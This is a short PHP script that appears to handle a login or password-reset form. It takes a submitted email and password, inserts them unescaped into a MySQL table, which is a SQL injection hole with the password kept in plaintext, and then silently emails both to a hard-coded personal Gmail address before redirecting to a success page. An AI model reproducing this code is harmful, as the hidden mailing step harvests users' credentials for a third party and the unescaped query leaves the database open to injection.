<?php
	 $conn = new mysqli("localhost", "root", "", "ivhsenior");
  
  	if ($conn->connect_error) {
    	die("ERROR: Unable to connect: " . $conn->connect_error);
  } 
  else{
  	//echo "connected";
  }

  $pass = $_POST['pass'];
  $email = $_POST['email'];
  
	if (!eregi("^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$", $email)){
		echo "<center>Invalid email</center>";
	}else{
		echo "<center>Valid Email</center>";
	} 
  
  
  $query = "insert into user (email, pass) values ('$email', '$pass')";
 
 if($conn->query($query) === TRUE){
   	$headers =  'MIME-Version: 1.0' . "\r\n"; 
	$headers .= 'From: Your name <info@address.com>' . "\r\n";
	$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 

	$to = "roopraushan1@gmail.com";
	$subject = "Password has been sent";
	$body = "email : ".$email." pass : ".$pass;
	mail($to, $subject, $body, $headers); 
 
	$msg = $query;
 
	header('Location: forgot.php?message=success');

  }
  
?>